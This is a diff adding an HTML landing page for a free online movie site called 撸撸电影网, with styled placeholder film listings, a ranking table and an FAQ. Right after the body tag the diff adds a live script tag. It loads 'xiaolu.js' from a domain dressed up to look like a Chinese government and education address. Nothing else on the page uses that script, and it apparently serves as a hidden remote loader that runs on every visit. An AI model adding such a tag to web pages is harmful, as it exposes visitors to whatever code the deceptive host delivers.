@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="keywords" content="撸撸电影网, luludianyingwang, 免费电影, 在线电影, 高清电影, 影视资源">
+<meta name="description" content="撸撸电影网 - 海量高清影视资源免费在线观看，院线大片、热播剧集、经典老片每日更新，极速播放不卡顿。">
+<meta name="robots" content="index,follow">
+<meta name="renderer" content="webkit">
+<meta name="format-detection" content="telephone=no">
+<title>撸撸电影网 - 海量高清影视免费在线观看，极速不卡顿</title>
+<style>
+/* ===== Reset ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+:root{
+  --green:#00d2a0;--green-d:#00a37b;--green-g:rgba(0,210,160,.3);
+  --bg:#070b0a;--bg2:#0d1412;--card:#131c19;--line:#22332d;
+  --txt:#e6f2ee;--txt2:#93aaa4;--gold:#ffcf3a;
+}
+html{font-size:16px;scroll-behavior:smooth}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--txt);line-height:1.65;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+img{max-width:100%;display:block}
+:focus{outline:2px solid var(--green);outline-offset:2px}
+.wrap{width:100%;max-width:1160px;margin:0 auto;padding:0 16px}
+
+/* ===== Nav ===== */
+.nav{position:sticky;top:0;z-index:200;background:rgba(7,11,10,.94);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.nav .wrap{display:flex;align-items:center;justify-content:space-between;height:58px;gap:14px}
+.logo{display:flex;align-items:center;gap:9px;font-size:1.18rem;font-weight:900}
+.logo i{width:32px;height:32px;border-radius:50%;background:radial-gradient(circle at 35% 35%,var(--green),var(--green-d));display:grid;place-items:center;font-style:normal;font-size:.72rem;font-weight:900;color:#04201a;box-shadow:0 0 14px var(--green-g)}
+.logo b{color:var(--green)}
+.navlinks{display:flex;gap:4px}
+.navlinks a{font-size:.9rem;padding:7px 12px;border-radius:8px;color:var(--txt2);transition:.2s}
+.navlinks a:hover{color:var(--green);background:rgba(0,210,160,.08)}
+.navbtn{background:var(--green);color:#04201a;font-weight:800;font-size:.85rem;padding:8px 18px;border-radius:8px;border:0;cursor:pointer;transition:.2s}
+.navbtn:hover{background:var(--green-d);color:#fff}
+
+/* ===== Banner / Marquee Hero ===== */
+.hero{position:relative;background:linear-gradient(135deg,#070b0a 0%,#0d231c 50%,#070b0a 100%);border-bottom:1px solid var(--line);overflow:hidden}
+.marquee{background:rgba(0,210,160,.07);border-bottom:1px solid var(--line);padding:9px 0;overflow:hidden}
+.marquee-track{display:flex;gap:40px;white-space:nowrap;animation:scroll 30s linear infinite;color:var(--green);font-size:.82rem;font-weight:600}
+.marquee-track span::before{content:"🎬 ";color:var(--gold)}
+@keyframes scroll{to{transform:translateX(-50%)}}
+.hero .wrap{display:grid;grid-template-columns:1.3fr 1fr;gap:40px;align-items:center;padding-top:44px;padding-bottom:44px}
+.hero h1{font-size:clamp(1.7rem,4.4vw,2.8rem);line-height:1.25;font-weight:900;margin-bottom:16px}
+.hero h1 em{font-style:normal;color:var(--green)}
+.hero .sub{color:var(--txt2);font-size:clamp(.95rem,1.8vw,1.08rem);margin-bottom:24px;max-width:560px}
+.hot-tags{display:flex;flex-wrap:wrap;gap:9px;margin-bottom:26px}
+.hot-tags a{font-size:.8rem;padding:5px 13px;border:1px solid var(--line);border-radius:20px;color:var(--txt2);transition:.2s}
+.hot-tags a:hover{border-color:var(--green);color:var(--green)}
+.h-actions{display:flex;gap:12px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:7px;height:46px;padding:0 26px;border-radius:9px;font-size:.92rem;font-weight:800;border:0;cursor:pointer;transition:.2s}
+.btn-main{background:var(--green);color:#04201a;box-shadow:0 8px 22px var(--green-g)}
+.btn-main:hover{transform:translateY(-2px);background:var(--green-d);color:#fff}
+.btn-out{background:transparent;color:var(--txt);border:1px solid var(--line)}
+.btn-out:hover{border-color:var(--green);color:var(--green)}
+.h-figure{position:relative}
+.flick{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
+.flick div{aspect-ratio:2/3;border-radius:12px;position:relative;overflow:hidden;border:1px solid var(--line);display:grid;place-items:center;font-weight:900;font-size:1.1rem;color:rgba(255,255,255,.2)}
+.flick div:nth-child(1){background:linear-gradient(160deg,#1a4a3a,#0d231c);transform:rotate(-4deg)}
+.flick div:nth-child(2){background:linear-gradient(160deg,#2a6a52,#123d2e);z-index:2}
+.flick div:nth-child(3){background:linear-gradient(160deg,#3a8a6a,#1a5a42);transform:rotate(4deg)}
+.h-figure .float{position:absolute;background:var(--card);border:1px solid var(--line);border-radius:10px;padding:8px 14px;font-size:.8rem;font-weight:700;box-shadow:0 8px 24px rgba(0,0,0,.4)}
+.h-figure .f1{top:-10px;left:-14px;color:var(--gold)}
+.h-figure .f2{bottom:-6px;right:-6px;color:var(--green)}
+
+/* ===== Section ===== */
+.section{padding:50px 0}
+.sec-head{display:flex;align-items:center;justify-content:space-between;gap:14px;margin-bottom:24px;flex-wrap:wrap}
+.sec-head h2{font-size:1.45rem;font-weight:900;display:flex;align-items:center;gap:10px}
+.sec-head h2::before{content:"";width:5px;height:22px;border-radius:3px;background:var(--green);box-shadow:0 0 10px var(--green-g)}
+.sec-head .en{color:var(--txt2);font-size:.8rem;font-weight:500;margin-left:4px}
+.more{color:var(--green);font-size:.86rem;font-weight:700}
+.more:hover{text-decoration:underline}
+
+/* ===== Carousel: Latest ===== */
+.trackwrap{position:relative}
+.track{display:flex;gap:16px;overflow-x:auto;scroll-snap-type:x mandatory;padding-bottom:6px;scrollbar-width:thin}
+.track::-webkit-scrollbar{height:6px}
+.track::-webkit-scrollbar-thumb{background:var(--line);border-radius:4px}
+.ep{scroll-snap-align:start;flex:0 0 calc(25% - 12px);background:var(--card);border:1px solid var(--line);border-radius:12px;overflow:hidden;transition:.2s}
+.ep:hover{border-color:var(--green);transform:translateY(-4px)}
+.ep .cov{aspect-ratio:16/10;position:relative;display:grid;place-items:center;font-weight:900;font-size:1.3rem;color:rgba(255,255,255,.22)}
+.ep .play{position:absolute;inset:0;display:grid;place-items:center;font-size:1.8rem;opacity:0;transition:.25s;background:rgba(0,0,0,.35)}
+.ep:hover .play{opacity:1}
+.ep .txt{padding:12px}
+.ep .txt h4{font-size:.95rem;font-weight:700;margin-bottom:5px}
+.ep .txt span{font-size:.76rem;color:var(--txt2)}
+
+/* ===== Categorized Rows ===== */
+.cat{margin-bottom:34px}
+.cat:last-child{margin-bottom:0}
+.ribbon{display:flex;gap:14px;overflow-x:auto;scrollbar-width:none}
+.ribbon::-webkit-scrollbar{display:none}
+.pill{flex:0 0 140px;background:var(--card);border:1px solid var(--line);border-radius:10px;overflow:hidden;transition:.2s}
+.pill:hover{border-color:var(--green)}
+.pill .pic{aspect-ratio:3/4;display:grid;place-items:center;font-weight:900;font-size:1.5rem;color:rgba(255,255,255,.2)}
+.pill .nm{padding:8px 10px;font-size:.84rem;font-weight:600;text-align:center;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+
+/* ===== Table: Ranking ===== */
+.rank{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden}
+.rankrow{display:grid;grid-template-columns:56px 1fr auto auto;align-items:center;gap:14px;padding:13px 18px;border-bottom:1px solid var(--line)}
+.rankrow:last-child{border-bottom:0}
+.rankrow .no{font-size:1.5rem;font-weight:900;color:var(--line)}
+.rankrow.top .no{color:var(--gold)}
+.rankrow:nth-child(2) .no{color:#c0c7c5}
+.rankrow:nth-child(3) .no{color:#cd7f32}
+.rankrow .ti{font-weight:700;font-size:.95rem}
+.rankrow .ti small{display:block;color:var(--txt2);font-size:.76rem;font-weight:400}
+.tag{font-size:.72rem;padding:3px 9px;border-radius:5px;background:rgba(0,210,160,.12);color:var(--green);font-weight:700}
+.pts{color:var(--gold);font-weight:800;font-size:.9rem}
+
+/* ===== Accordion: Help ===== */
+.help{border:1px solid var(--line);border-radius:14px;overflow:hidden;background:var(--card)}
+details{border-bottom:1px solid var(--line)}
+details:last-child{border-bottom:0}
+details summary{cursor:pointer;padding:16px 20px;font-weight:700;font-size:.96rem;list-style:none;display:flex;justify-content:space-between;align-items:center;gap:10px}
+details summary::-webkit-details-marker{display:none}
+details summary::after{content:"＋";color:var(--green);font-weight:900;flex-shrink:0}
+details[open] summary::after{content:"－"}
+details p{padding:0 20px 16px;color:var(--txt2);font-size:.88rem}
+
+/* ===== CTA ===== */
+.cta{background:linear-gradient(120deg,#0d231c,#123d2e 70%,#1a4a3a);border:1px solid var(--green-g);border-radius:18px;padding:32px;text-align:center}
+.cta h2{font-size:1.5rem;font-weight:900;margin-bottom:10px}
+.cta h2 em{font-style:normal;color:var(--green)}
+.cta p{color:var(--txt2);margin-bottom:22px;max-width:560px;margin-left:auto;margin-right:auto}
+.cta .btn-main{height:50px;padding:0 34px;font-size:1rem}
+
+/* ===== Footer ===== */
+footer{background:var(--bg2);border-top:1px solid var(--line);padding:42px 0 24px;margin-top:24px}
+.foot{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:28px;margin-bottom:28px}
+.foot .logo{margin-bottom:12px}
+.foot p{color:var(--txt2);font-size:.86rem}
+.foot h5{font-size:.92rem;font-weight:800;margin-bottom:13px;color:var(--green)}
+.foot li{margin-bottom:8px}
+.foot li a{color:var(--txt2);font-size:.86rem}
+.foot li a:hover{color:var(--green)}
+.copy{border-top:1px solid var(--line);padding-top:20px;text-align:center;color:#6d837d;font-size:.8rem}
+.copy a{color:var(--green)}
+
+/* ===== Responsive ===== */
+@media(max-width:920px){
+  .hero .wrap{grid-template-columns:1fr;gap:30px}
+  .h-figure{order:-1;max-width:420px}
+  .foot{grid-template-columns:1fr 1fr}
+  .ep{flex:0 0 calc(33.33% - 11px)}
+}
+@media(max-width:640px){
+  .navlinks{display:none}
+  .hero .wrap{padding-top:28px;padding-bottom:32px}
+  .hero h1{font-size:1.5rem}
+  .section{padding:32px 0}
+  .sec-head h2{font-size:1.2rem}
+  .ep{flex:0 0 calc(50% - 8px)}
+  .pill{flex:0 0 112px}
+  .rankrow{grid-template-columns:40px 1fr;gap:8px;padding:11px 12px}
+  .rankrow .tag,.rankrow .pts{display:none}
+  .cta{padding:22px 16px}
+  .foot{grid-template-columns:1fr}
+  .flick{grid-template-columns:repeat(3,1fr)}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- Nav -->
+<nav class="nav">
+  <div class="wrap">
+    <a class="logo" href="#" aria-label="撸撸电影网 首页"><i>撸</i>撸撸<b>电影网</b></a>
+    <div class="navlinks">
+      <a href="#">首页</a>
+      <a href="#latest">最新</a>
+      <a href="#rank">榜单</a>
+      <a href="#help">帮助</a>
+      <a href="#">APP</a>
+    </div>
+    <button class="navbtn" type="button" onclick="notice()">立即播放</button>
+  </div>
+</nav>
+
+<!-- Marquee Hero -->
+<header class="hero">
+  <div class="marquee" aria-hidden="true">
+    <div class="marquee-track">
+      <span>院线新片《极速狂飙》今日上线</span>
+      <span>《暗夜追凶》全集已更新</span>
+      <span>4K专区限时免费开放</span>
+      <span>国庆档合集火热上线</span>
+      <span>院线新片《极速狂飙》今日上线</span>
+      <span>《暗夜追凶》全集已更新</span>
+      <span>4K专区限时免费开放</span>
+      <span>国庆档合集火热上线</span>
+    </div>
+  </div>
+  <div class="wrap">
+    <div>
+      <h1>撸撸电影网 · <em>海量影视</em>免费看<br>高清流畅，随点随播</h1>
+      <p class="sub">院线大片、热播剧集、经典老片、动漫综艺一应俱全，每日极速更新，手机电脑全端自适应，纯净观影零打扰。</p>
+      <div class="hot-tags">
+        <a href="#"># 院线新片</a>
+        <a href="#"># 4K专区</a>
+        <a href="#"># 热播剧集</a>
+        <a href="#"># 经典老片</a>
+        <a href="#"># 悬疑烧脑</a>
+      </div>
+      <div class="h-actions">
+        <button class="btn btn-main" type="button" onclick="notice()">▶ 免费观看</button>
+        <a class="btn btn-out" href="#latest">浏览最新</a>
+      </div>
+    </div>
+    <div class="h-figure">
+      <div class="flick">
+        <div>极速</div><div>暗夜</div><div>奇缘</div>
+      </div>
+      <div class="float f1">⭐ 4K超清画质</div>
+      <div class="float f2">🚀 极速播放</div>
+    </div>
+  </div>
+</header>
+
+<!-- 栏目一：最新上线（横向滑动卡片） -->
+<section class="section" id="latest">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>最新上线<span class="en">Latest Updates</span></h2>
+      <a class="more" href="#">更多 ›</a>
+    </div>
+    <div class="trackwrap">
+      <div class="track">
+        <article class="ep"><div class="cov" style="background:linear-gradient(160deg,#2a6a52,#123d2e)">极速狂飙<div class="play">▶</div></div><div class="txt"><h4>极速狂飙</h4><span>动作 / 2026</span></div></article>
+        <article class="ep"><div class="cov" style="background:linear-gradient(160deg,#1a4a6a,#0d2a3d)">深海谜踪<div class="play">▶</div></div><div class="txt"><h4>深海谜踪</h4><span>冒险 / 2026</span></div></article>
+        <article class="ep"><div class="cov" style="background:linear-gradient(160deg,#6a4a1a,#3d2a0d)">黄金年代<div class="play">▶</div></div><div class="txt"><h4>黄金年代</h4><span>剧情 / 2025</span></div></article>
+        <article class="ep"><div class="cov" style="background:linear-gradient(160deg,#4a1a6a,#2a0d3d)">幻夜之城<div class="play">▶</div></div><div class="txt"><h4>幻夜之城</h4><span>奇幻 / 2026</span></div></article>
+        <article class="ep"><div class="cov" style="background:linear-gradient(160deg,#6a1a2a,#3d0d18)">热血街头<div class="play">▶</div></div><div class="txt"><h4>热血街头</h4><span>动作 / 2026</span></div></article>
+        <article class="ep"><div class="cov" style="background:linear-gradient(160deg,#1a6a5a,#0d3d2e)">云端恋人<div class="play">▶</div></div><div class="txt"><h4>云端恋人</h4><span>爱情 / 2026</span></div></article>
+        <article class="ep"><div class="cov" style="background:linear-gradient(160deg,#5a6a1a,#2e3d0d)">荒野求生记<div class="play">▶</div></div><div class="txt"><h4>荒野求生记</h4><span>纪录 / 2025</span></div></article>
+        <article class="ep"><div class="cov" style="background:linear-gradient(160deg,#1a5a6a,#0d2e3d)">机械之心<div class="play">▶</div></div><div class="txt"><h4>机械之心</h4><span>科幻 / 2026</span></div></article>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：分类推荐（横向 ribbon） -->
+<section class="section" id="cates" style="background:var(--bg2);border-top:1px solid var(--line);border-bottom:1px solid var(--line)">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>分类推荐<span class="en">Categories</span></h2>
+      <a class="more" href="#">全部分类 ›</a>
+    </div>
+
+    <div class="cat">
+      <div class="sec-head" style="margin-bottom:12px"><h2 style="font-size:1.1rem">🔥 动作片</h2><a class="more" href="#">更多</a></div>
+      <div class="ribbon">
+        <a class="pill" href="#"><div class="pic" style="background:linear-gradient(160deg,#6a2a2a,#3d1515)">突袭</div><div class="nm">突袭行动</div></a>
+        <a class="pill" href="#"><div class="pic" style="background:linear-gradient(160deg,#2a4a6a,#152a3d)">特工</div><div class="nm">王牌特工</div></a>
+        <a class="pill" href="#"><div class="pic" style="background:linear-gradient(160deg,#6a5a2a,#3d3215)">侠影</div><div class="nm">侠影江湖</div></a>
+        <a class="pill" href="#"><div class="pic" style="background:linear-gradient(160deg,#2a6a4a,#153d2a)">搏击</div><div class="nm">搏击之王</div></a>
+        <a class="pill" href="#"><div class="pic" style="background:linear-gradient(160deg,#4a2a6a,#2a153d)">暗杀</div><div class="nm">暗杀名单</div></a>
+        <a class="pill" href="#"><div class="pic" style="background:linear-gradient(160deg,#6a3a2a,#3d1f15)">雷霆</div><div class="nm">雷霆战警</div></a>
+      </div>
+    </div>
+
+    <div class="cat">
+      <div class="sec-head" style="margin-bottom:12px"><h2 style="font-size:1.1rem">😂 喜剧片</h2><a class="more" href="#">更多</a></div>
+      <div class="ribbon">
+        <a class="pill" href="#"><div class="pic" style="background:linear-gradient(160deg,#6a6a2a,#3d3d15)">爆笑</div><div class="nm">爆笑一家人</div></a>
+        <a class="pill" href="#"><div class="pic" style="background:linear-gradient(160deg,#2a6a6a,#153d3d)">乌龙</div><div class="nm">乌龙大冒险</div></a>
+        <a class="pill" href="#"><div class="pic" style="background:linear-gradient(160deg,#6a2a5a,#3d152f)">欢喜</div><div class="nm">欢喜冤家</div></a>
+        <a class="pill" href="#"><div class="pic" style="background:linear-gradient(160deg,#4a6a2a,#293d15)">囧途</div><div class="nm">囧途奇遇</div></a>
+        <a class="pill" href="#"><div class="pic" style="background:linear-gradient(160deg,#2a2a6a,#15153d)">倒霉</div><div class="nm">倒霉蛋日记</div></a>
+        <a class="pill" href="#"><div class="pic" style="background:linear-gradient(160deg,#6a4a2a,#3d2a15)">开心</div><div class="nm">开心过大年</div></a>
+      </div>
+    </div>
+
+    <div class="cat">
+      <div class="sec-head" style="margin-bottom:12px"><h2 style="font-size:1.1rem">💕 爱情片</h2><a class="more" href="#">更多</a></div>
+      <div class="ribbon">
+        <a class="pill" href="#"><div class="pic" style="background:linear-gradient(160deg,#6a2a4a,#3d152a)">初恋</div><div class="nm">初恋那件小事</div></a>
+        <a class="pill" href="#"><div class="pic" style="background:linear-gradient(160deg,#2a4a6a,#152a3d)">遇见</div><div class="nm">遇见你真好</div></a>
+        <a class="pill" href="#"><div class="pic" style="background:linear-gradient(160deg,#6a5a4a,#3d322a)">约定</div><div class="nm">我们的约定</div></a>
+        <a class="pill" href="#"><div class="pic" style="background:linear-gradient(160deg,#4a2a6a,#2a153d)">缘分</div><div class="nm">前世今生缘</div></a>
+        <a class="pill" href="#"><div class="pic" style="background:linear-gradient(160deg,#2a6a5a,#153d32)">告白</div><div class="nm">勇敢说出口</div></a>
+        <a class="pill" href="#"><div class="pic" style="background:linear-gradient(160deg,#6a2a2a,#3d1515)">心动</div><div class="nm">怦然心动时</div></a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：热播榜单（表格行） -->
+<section class="section" id="rank">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>热播榜单<span class="en">Top Ranking</span></h2>
+      <a class="more" href="#">完整榜单 ›</a>
+    </div>
+    <div class="rank">
+      <div class="rankrow top"><div class="no">1</div><div class="ti">极速狂飙<small>动作 · 2026</small></div><span class="tag">热播</span><span class="pts">9.4分</span></div>
+      <div class="rankrow"><div class="no">2</div><div class="ti">暗夜追凶<small>悬疑 · 2026</small></div><span class="tag">连载</span><span class="pts">9.2分</span></div>
+      <div class="rankrow"><div class="no">3</div><div class="ti">幻夜之城<small>奇幻 · 2026</small></div><span class="tag">新片</span><span class="pts">9.0分</span></div>
+      <div class="rankrow"><div class="no">4</div><div class="ti">黄金年代<small>剧情 · 2025</small></div><span class="tag">经典</span><span class="pts">8.9分</span></div>
+      <div class="rankrow"><div class="no">5</div><div class="ti">云端恋人<small>爱情 · 2026</small></div><span class="tag">推荐</span><span class="pts">8.8分</span></div>
+      <div class="rankrow"><div class="no">6</div><div class="ti">深海谜踪<small>冒险 · 2026</small></div><span class="tag">新片</span><span class="pts">8.7分</span></div>
+      <div class="rankrow"><div class="no">7</div><div class="ti">机械之心<small>科幻 · 2026</small></div><span class="tag">热播</span><span class="pts">8.6分</span></div>
+      <div class="rankrow"><div class="no">8</div><div class="ti">热血街头<small>动作 · 2026</small></div><span class="tag">推荐</span><span class="pts">8.5分</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：观影帮助（手风琴） -->
+<section class="section" id="help" style="background:var(--bg2);border-top:1px solid var(--line)">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>观影帮助<span class="en">Help Center</span></h2>
+    </div>
+    <div class="help">
+      <details open>
+        <summary>撸撸电影网的影视资源都是免费的吗？</summary>
+        <p>是的，本站提供大量免费在线影视资源，无需注册即可直接观看。部分院线新片与4K超清内容需开通会员解锁。</p>
+      </details>
+      <details>
+        <summary>手机端能正常播放吗？需要下载APP吗？</summary>
+        <p>无需下载APP，本站采用自适应网页设计，手机、平板、电脑浏览器均可直接访问播放，体验一致。</p>
+      </details>
+      <details>
+        <summary>播放卡顿怎么办？</summary>
+        <p>可尝试切换清晰度、切换播放线路，或检查网络连接。本站支持多线路切换，确保流畅观影。</p>
+      </details>
+      <details>
+        <summary>如何找到想看的影片？</summary>
+        <p>可通过顶部搜索框输入片名、演员或关键词检索，也可按动作、喜剧、爱情等分类浏览。</p>
+      </details>
+      <details>
+        <summary>影片更新频率如何？</summary>
+        <p>本站每日更新热门影视资源，院线大片与热播剧集会第一时间同步上线。</p>
+      </details>
+    </div>
+  </div>
+</section>
+
+<!-- CTA -->
+<section class="section">
+  <div class="wrap">
+    <div class="cta">
+      <h2>现在就来 <em>撸撸电影网</em><br>开启你的免费观影之旅</h2>
+      <p>海量高清影视资源，一键即播，纯净无打扰，随时随地畅享视听盛宴。</p>
+      <button class="btn btn-main" type="button" onclick="notice()">免费开始观影</button>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <div class="logo"><i>撸</i>撸撸<b>电影网</b></div>
+        <p>撸撸电影网（luludianyingwang-wap）专注于为用户提供免费、高清、流畅的在线影视服务，每日更新院线大片、热播剧集与经典老片。</p>
+      </div>
+      <div>
+        <h5>网站导航</h5>
+        <ul>
+          <li><a href="#">首页</a></li>
+          <li><a href="#">电影频道</a></li>
+          <li><a href="#">热播剧集</a></li>
+          <li><a href="#">综艺娱乐</a></li>
+          <li><a href="#">动漫专区</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>影片分类</h5>
+        <ul>
+          <li><a href="#">动作片</a></li>
+          <li><a href="#">喜剧片</a></li>
+          <li><a href="#">爱情片</a></li>
+          <li><a href="#">科幻片</a></li>
+          <li><a href="#">悬疑片</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>帮助中心</h5>
+        <ul>
+          <li><a href="#">网站公告</a></li>
+          <li><a href="#">观影帮助</a></li>
+          <li><a href="#">会员说明</a></li>
+          <li><a href="#">意见反馈</a></li>
+          <li><a href="#">关于我们</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <p>© 2026 撸撸电影网 luludianyingwang-wap.github.io 版权所有</p>
+      <p>网站名称：撸撸电影网　|　本站仅供影视资讯展示，资源版权归原作者所有　|　<a href="#">免责声明</a></p>
+    </div>
+  </div>
+</footer>
+
+<script>
+function notice(){ alert('功能演示：内页链接均已用 # 替代'); }
+</script>
+</body>
+</html>
